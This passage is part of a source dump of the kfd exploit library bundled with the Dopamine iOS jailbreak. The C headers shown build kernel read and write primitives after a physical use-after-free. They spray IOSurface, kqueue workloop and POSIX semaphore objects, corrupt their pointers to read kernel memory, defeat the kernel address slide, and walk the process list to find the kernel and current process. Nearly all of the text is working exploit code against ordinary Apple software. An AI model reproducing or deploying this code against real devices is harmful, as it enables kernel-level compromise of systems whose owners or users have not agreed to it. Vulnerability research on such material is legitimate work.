void krkw_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    assert(kaddr >= 0xfffff00000000000);
    kfd->kwrite.krkw_method_ops.kwrite(kfd, uaddr, kaddr, size);
}

void krkw_free(struct kfd* kfd)
{
    krkw_helper_free(kfd, &kfd->kread);
    krkw_helper_free(kfd, &kfd->kwrite);
}

/*
 * Helper krkw functions.
 */

void krkw_helper_init(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.init(kfd);
}

bool krkw_helper_grab_free_pages(struct kfd* kfd)
{
    //timer_start();

    uint64_t device_ram = 0;
    size_t device_ram_size = sizeof(device_ram);
    int res = sysctlbyname("hw.memsize", &device_ram, &device_ram_size, NULL, 0);

    const u64 copy_pages = (kfd->info.copy.size / pages(1));
    const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
    // For 8GB+, 200000 is the minimum needed for a reliable exploit. For 16GB, 400000 is the minimum.
    // hw.memsize reports the amount of RAM after carveouts, so we pick a value lower than the
    // actual amount of RAM to compare against.
    u64 grabbed_free_pages_max = 80000;
    if (device_ram >= 1024 * 1024 * 1024 * 12ULL) { // 16GB devices
        grabbed_free_pages_max = 800000;
    } else if (device_ram >= 1024 * 1024 * 1024 * 5ULL) { // 6GB/8GB devices
        grabbed_free_pages_max = 200000;
    }
    print("RAM size: 0x%llx, free pages max: 0x%llx\n", device_ram, grabbed_free_pages_max);

    for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
        assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));

        u64 grabbed_puaf_pages = 0;
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
                if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                    print_u64(grabbed_free_pages);
                    //timer_end();
                    return true;
                }
            }
        }
    }

    print_warning("failed to grab free pages goal (goal %llu, max %llu, RAM size 0x%llx)", grabbed_puaf_pages_goal, grabbed_free_pages_max, device_ram);
    return false;
}

bool krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw)
{
    //timer_start();
    const u64 batch_size = (pages(1) / krkw->krkw_object_size);

    while (true) {
        /*
         * Spray a batch of objects, but stop if the maximum id has been reached.
         */
        bool maximum_reached = false;

        for (u64 i = 0; i < batch_size; i++) {
            if (krkw->krkw_allocated_id == krkw->krkw_maximum_id) {
                maximum_reached = true;
                break;
            }

            krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
            krkw->krkw_allocated_id++;
        }

        /*
         * Search the puaf pages for the last batch of objects.
         *
         * Note that we make the following assumptions:
         * - All objects have a 64-bit alignment.
         * - All objects can be found within 1/16th of a page.
         * - All objects have a size smaller than 15/16th of a page.
         */
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            u64 stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
            for (u64 object_uaddr = puaf_page_uaddr; object_uaddr < stop_uaddr; object_uaddr += sizeof(u64)) {
                if (krkw->krkw_method_ops.search(kfd, object_uaddr)) {
                    krkw->krkw_searched_id = krkw->krkw_object_id;
                    krkw->krkw_object_uaddr = object_uaddr;
                    goto loop_break;
                }
            }
        }

        krkw->krkw_searched_id = krkw->krkw_allocated_id;

        if (maximum_reached) {
loop_break:
            break;
        }
    }

    //timer_end();
    const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";

    if (!krkw->krkw_object_uaddr) {
        for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
            u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
            print_buffer(puaf_page_uaddr, 64);
        }

        //assert_false(krkw_type);
        return false;
    }

    print_message(
        "%s ---> object_id = %llu, object_uaddr = 0x%016llx, object_size = %llu, allocated_id = %llu/%llu, batch_size = %llu",
        krkw_type,
        krkw->krkw_object_id,
        krkw->krkw_object_uaddr,
        krkw->krkw_object_size,
        krkw->krkw_allocated_id,
        krkw->krkw_maximum_id,
        batch_size
    );

    print_buffer(krkw->krkw_object_uaddr, krkw->krkw_object_size);

    if (!kfd->info.kaddr.current_proc) {
        krkw->krkw_method_ops.find_proc(kfd);
    }
    return true;
}

void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw)
{
    timer_start();

    for (u64 id = 0; id < krkw->krkw_allocated_id; id++) {
        if (id == krkw->krkw_object_id) {
            continue;
        }

        krkw->krkw_method_ops.deallocate(kfd, id);
    }

    timer_end();
}

void krkw_helper_free(struct kfd* kfd, struct krkw* krkw)
{
    krkw->krkw_method_ops.free(kfd);

    if (krkw->krkw_method_data) {
        bzero_free(krkw->krkw_method_data, krkw->krkw_method_data_size);
    }
}

#endif /* krkw_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/IOSurface_shared.h`:

```h
//
//  IOSurface_shared.h
//  kfd
//
//  Created by Lars Fröder on 29.07.23.
//  Mostly stolen from weightBufs: https://github.com/0x36/weightBufs

#ifndef IOSurface_shared_h
#define IOSurface_shared_h

#ifdef __cplusplus
extern "C" {
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>

#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

#define False  0
#define True   1


#define CHECK_IOKIT_ERR(kr,name)  do {                          \
                if (kr != KERN_SUCCESS) {                       \
                        printf("%s : %s (0x%x)\n",              \
                               name,mach_error_string(kr),kr);  \
                }                                               \
        }while(0);
        typedef uint64_t u64;
        typedef uint32_t u32;


CFNumberRef CFInt32(int32_t value);
CFNumberRef CFInt64(int64_t value);

enum {
        kOSSerializeDictionary   = 0x01000000U,
        kOSSerializeArray        = 0x02000000U,
        kOSSerializeSet          = 0x03000000U,
        kOSSerializeNumber       = 0x04000000U,
        kOSSerializeSymbol       = 0x08000000U,
        kOSSerializeString       = 0x09000000U,
        kOSSerializeData         = 0x0a000000U,
        kOSSerializeBoolean      = 0x0b000000U,
        kOSSerializeObject       = 0x0c000000U,
        kOSSerializeTypeMask     = 0x7F000000U,
        kOSSerializeDataMask     = 0x00FFFFFFU,

        kOSSerializeEndCollection = 0x80000000U,
};

// IOKIT
typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;
typedef mach_port_t io_registry_entry_t;

#ifndef IO_OBJECT_NULL
#define IO_OBJECT_NULL 0
#endif
extern const mach_port_t kIOMasterPortDefault;

kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
        kern_return_t IOConnectMapMemory(io_connect_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, uint32_t options);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,io_connect_t *connect);
kern_return_t IOServiceGetMatchingServices(mach_port_t masterPort, CFDictionaryRef matching, io_iterator_t *existing);
kern_return_t IOServiceClose(io_connect_t connect);
uint32_t IOObjectGetRetainCount(io_object_t object);
uint32_t IOObjectGetKernelRetainCount(io_object_t object);
uint32_t IOObjectGetRetainCount(io_object_t object);
kern_return_t io_object_get_retain_count(mach_port_t object,uint32_t *retainCount);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);
kern_return_t IOConnectSetNotificationPort(io_connect_t connect, uint32_t type, mach_port_t port, uintptr_t reference);
CFMutableDictionaryRef IOServiceMatching(const char *name);
CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *errorString);

typedef struct {
        io_connect_t client;
        uint8_t *sInput;
        uint32_t sInputSize;
        uint8_t * sOutput;
        size_t sOutputSize;
        mach_port_t asyncAwake;
        uint64_t references[8];
        uint32_t referenceCnt;
        uint64_t scalarI[0x10];
        uint64_t scalarO[0x10];
        uint32_t scalarISize;
        size_t scalarOSize;
} IOKit_args_t;

#ifdef __cplusplus
}
#endif

#include <IOSurface/IOSurfaceRef.h>

#define IOSurfaceLockResultSize 0xF60

#define kOSSerializeBinarySignature        0x000000D3
#define kOSSerializeIndexedBinarySignature 0x000000D4

typedef struct IOSurfaceFastCreateArgs
{
        uint64_t IOSurfaceAddress;
        uint32_t IOSurfaceWidth;
        uint32_t IOSurfaceHeight;
        uint32_t IOSurfacePixelFormat;
        uint32_t IOSurfaceBytesPerElement;
        uint32_t IOSurfaceBytesPerRow;
        uint32_t IOSurfaceAllocSize;
} IOSurfaceFastCreateArgs;

struct iosurface_obj {
    io_connect_t port;
    u32 surface_id;
};

io_connect_t iokit_get_connection(const char *name,unsigned int type)
{
        io_service_t service  = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                            IOServiceMatching(name));
        if (service == IO_OBJECT_NULL) {
                printf("unable to find service \n");
                exit(-1);
        }

        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &conn);
        if(kr != KERN_SUCCESS) {
                printf("[x] Could not open %s: %s\n",name,mach_error_string(kr));
                exit(-1);

        }
        return conn;
}


io_connect_t get_surface_client(void)
{
        return iokit_get_connection("IOSurfaceRoot",0);
}


io_connect_t create_surface_fast_path(io_connect_t surface,uint32_t *surface_id,IOSurfaceFastCreateArgs *args)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        char output[IOSurfaceLockResultSize] = {0};
        size_t output_cnt = IOSurfaceLockResultSize;

        if (surface == 0) {
                conn = get_surface_client();
        }

        kr = IOConnectCallMethod(conn, 6, 0,0,
                                 args, 0x20,
                                 NULL, NULL, output, &output_cnt);
        CHECK_IOKIT_ERR(kr, "create_surface_fast_path");
        assert(kr == KERN_SUCCESS);

        if (surface_id != NULL)
                *surface_id = *(uint32_t *)(output + 0x18);

        return conn;
}


io_connect_t release_surface(io_connect_t surface,uint32_t surface_id)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        uint64_t scalar = (uint64_t)surface_id;
        kr = IOConnectCallMethod(conn, 1, &scalar,1,
                                 NULL,0,
                                 NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "release_surface");
        assert(kr == KERN_SUCCESS);

        return conn;
}

void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value)
{
        uint64_t args[3] = {0};
        args[0] = surface_id;
        args[1] = index;
        args[2] = value;
        kern_return_t kr = IOConnectCallMethod(c, 33, args,3,
                                               NULL, 0,
                                               NULL, NULL, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "set_indexed_timestamp");
}

kern_return_t iosurface_get_use_count(io_connect_t c,uint32_t surface_id,uint32_t *output)
{
        uint64_t args[1] = {0};
        args[0] = surface_id;
        uint32_t outsize = 1;
        uint64_t out = 0;

        kern_return_t kr = IOConnectCallMethod(c, 16, args,1,
                                               NULL, 0,
                                               &out, &outsize, NULL, NULL);
        CHECK_IOKIT_ERR(kr, "iosurface_get_use_count");
        *output = (uint32_t)out;
        return kr;
}

#endif /* IOSurface_shared_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kread/kread_IOSurface.h`:

```h
//
//  kread_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 29.07.23.
//

#ifndef kread_IOSurface_h
#define kread_IOSurface_h

#include "../IOSurface_shared.h"
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <mach-o/getsect.h>
#import <mach-o/loader.h>
#import <mach-o/nlist.h>
#import <mach-o/reloc.h>


#define IOSURFACE_MAGIC 0x1EA5CACE

io_connect_t g_surfaceConnect = 0;

u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_IOSurface_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 0x1000;
    kfd->kread.krkw_object_size = 0x400; //estimate

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);
    
    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
    // So we just call it here and keep the reference
    g_surfaceConnect = get_surface_client();
}

void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize =  (u32)id + 1;

    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;

    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
}

bool kread_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    u32 magic = *(u32 *)(object_uaddr + dynamic_info(IOSurface__pixelFormat));
    if (magic == IOSURFACE_MAGIC) {
        u64 id = *(u64 *)(object_uaddr + dynamic_info(IOSurface__allocSize)) - 1;
        kfd->kread.krkw_object_id = id;
        return true;
    }
    return false;
}

void kread_IOSurface_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u32, kread_IOSurface_kread_u32);
}

void get_kernel_section(struct kfd* kfd, u64 kernel_base, const char *segment, const char *section, u64 *addr_out, u64 *size_out)
{
    struct mach_header_64 kernel_header;
    kread((u64)kfd, kernel_base, &kernel_header, sizeof(kernel_header));
    
    uint64_t cmdStart = kernel_base + sizeof(kernel_header);
    uint64_t cmdEnd = cmdStart + kernel_header.sizeofcmds;
    
    uint64_t cmdAddr = cmdStart;
    for(int ci = 0; ci < kernel_header.ncmds && cmdAddr <= cmdEnd; ci++)
    {
        struct segment_command_64 cmd;
        kread((u64)kfd, cmdAddr, &cmd, sizeof(cmd));
        
        if(cmd.cmd == LC_SEGMENT_64)
        {
            uint64_t sectStart = cmdAddr + sizeof(cmd);
            bool finished = false;
            for(int si = 0; si < cmd.nsects; si++)
            {
                uint64_t sectAddr = sectStart + si * sizeof(struct section_64);
                struct section_64 sect;
                kread((u64)kfd, sectAddr, &sect, sizeof(sect));
                
                if (!strcmp(cmd.segname, segment) && !strcmp(sect.sectname, section)) {
                    *addr_out = sect.addr;
                    *size_out = sect.size;
                    finished = true;
                    break;
                }
            }
            if (finished) break;
        }
        
        cmdAddr += cmd.cmdsize;
    }
}

// credits to pongoOS KPF for the next two functions
static inline int64_t sxt64(int64_t value, uint8_t bits)
{
    value = ((uint64_t)value) << (64 - bits);
    value >>= (64 - bits);
    return value;
}

static inline int64_t adrp_off(uint32_t adrp)
{
    return sxt64((((((uint64_t)adrp >> 5) & 0x7ffffULL) << 2) | (((uint64_t)adrp >> 29) & 0x3ULL)) << 12, 33);
}


void kread_IOSurface_find_proc(struct kfd* kfd)
{
    u64 textPtr = UNSIGN_PTR(*(u64 *)(kfd->kread.krkw_object_uaddr + dynamic_info(IOSurface__isa)));
    
    struct mach_header_64 kernel_header;
    
    u64 kernel_base = 0;

    for (u64 page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
        struct mach_header_64 candidate_header;
        kread((u64)kfd, page, &candidate_header, sizeof(candidate_header));
        
        if (candidate_header.magic == 0xFEEDFACF) {
            kernel_header = candidate_header;
            kernel_base = page;
            break;
        }
    }
    if (kernel_header.filetype == 0xB) {
        // if we found 0xB, rescan forwards instead
        // don't ask me why (<=A10 specific issue)
        for (u64 page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
            struct mach_header_64 candidate_header;
            kread((u64)kfd, page, &candidate_header, sizeof(candidate_header));
            if (candidate_header.magic == 0xFEEDFACF) {
                kernel_header = candidate_header;
                kernel_base = page;
                break;
            }
        }
    }
    
    u64 kernel_slide = kernel_base - ARM64_LINK_ADDR;
    kfd->info.kaddr.kernel_slide = kernel_slide;
    u64 allproc = kernel_slide + dynamic_info(kernelcache__allproc);
    
    u64 proc_kaddr = 0;
    kread((u64)kfd, allproc, &proc_kaddr, sizeof(proc_kaddr));
    proc_kaddr = UNSIGN_PTR(proc_kaddr);
    while (proc_kaddr != 0) {
        u32 pid = (u32)dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
        }
        else if (pid == 0) {
            kfd->info.kaddr.kernel_proc = proc_kaddr;
        }
        proc_kaddr = dynamic_kget(proc__p_list__le_next, proc_kaddr);
    }
}

void kread_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (id != kfd->kread.krkw_object_id) {
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        release_surface(objectStorage[id].port, objectStorage[id].surface_id);
    }
}

void kread_IOSurface_free(struct kfd* kfd)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    if(kfd->kread.krkw_object_id) {
        struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
        release_surface(krwObject.port, krwObject.surface_id);
    }
    IOServiceClose(g_surfaceConnect);
}

/*
 * 32-bit kread function.
 */

u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
{
    u64 iosurface_uaddr = kfd->kread.krkw_object_uaddr;
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
    
    u64 backup = *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr));
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = kaddr - dynamic_info(IOSurface__readDisplacement);
    
    u32 read32 = 0;
    iosurface_get_use_count(krwObject.port, krwObject.surface_id, &read32);
    
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__useCountPtr)) = backup;
    
    return read32;
}

#endif /* kread_IOSurface_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kread/kread_kqueue_workloop_ctl.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_kqueue_workloop_ctl_h
#define kread_kqueue_workloop_ctl_h

const u64 kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr);

void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = sizeof(struct kqworkloop);
}

void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_flags = KQ_WORKLOOP_CREATE_SCHED_PRI,
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
        .kqwlp_sched_pri = 1,
    };

    u64 cmd = KQ_WORKLOOP_CREATE;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(object_uaddr);
    u64 sentinel_min = kread_kqueue_workloop_ctl_sentinel;
    u64 sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;

    u16 kqwl_state = kqwl->kqwl_kqueue.kq_state;
    u64 kqwl_dynamicid = kqwl->kqwl_dynamicid;

    if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
        (kqwl_dynamicid >= sentinel_min) &&
        (kqwl_dynamicid < sentinel_max)) {
        u64 object_id = kqwl_dynamicid - sentinel_min;
        kfd->kread.krkw_object_id = object_id;
        return true;
    }

    return false;
}

void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_kqueue_workloop_ctl_kread_u64);
}

void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    kfd->info.kaddr.current_proc = kqwl->kqwl_kqueue.kq_p;
}

void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
    };

    u64 cmd = KQ_WORKLOOP_DESTROY;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
    kread_kqueue_workloop_ctl_deallocate(kfd, kfd->kread.krkw_object_id);
}

/*
 * 64-bit kread function.
 */

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
{
    volatile struct kqworkloop* kqwl = (volatile struct kqworkloop*)(kfd->kread.krkw_object_uaddr);
    u64 old_kqwl_owner = kqwl->kqwl_owner;
    u64 new_kqwl_owner = kaddr - dynamic_info(thread__thread_id);
    kqwl->kqwl_owner = new_kqwl_owner;

    struct kqueue_dyninfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDDYNKQUEUE_INFO;
    u64 arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    kqwl->kqwl_owner = old_kqwl_owner;
    return data.kqdi_owner;
}

#endif /* kread_kqueue_workloop_ctl_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/krkw/kread/kread_sem_open.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > PAC_MASK) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    while (true) {
        i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */

```

